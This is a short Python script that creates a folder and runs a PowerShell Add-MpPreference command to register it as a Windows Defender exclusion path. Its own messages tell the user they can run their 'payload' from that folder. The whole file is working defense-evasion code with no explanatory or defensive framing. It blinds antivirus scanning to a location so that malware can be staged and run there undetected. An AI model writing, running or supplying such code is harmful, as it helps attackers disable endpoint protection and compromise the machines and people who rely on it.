import subprocess
import os

# Define the path to be excluded
exclusion_path = r"C:\ExcludedFolder"

# Create the directory if it does not exist
if not os.path.exists(exclusion_path):
    os.makedirs(exclusion_path)
    print(f"[+] Created directory for exclusion: {exclusion_path}")

# PowerShell command to add an exclusion to Defender
powershell_command = f"powershell.exe Add-MpPreference -ExclusionPath '{exclusion_path}'"

try:
    # Run the PowerShell command to add the exclusion path
    result = subprocess.run(powershell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    if result.returncode == 0:
        print(f"[+] Successfully added exclusion path: {exclusion_path}")
        print(f"[+] You can run your payload from: {exclusion_path}")
    else:
        print(f"[-] Failed to add exclusion: {result.stderr.decode()}")
except Exception as e:
    print(f"[-] Error executing PowerShell command: {e}")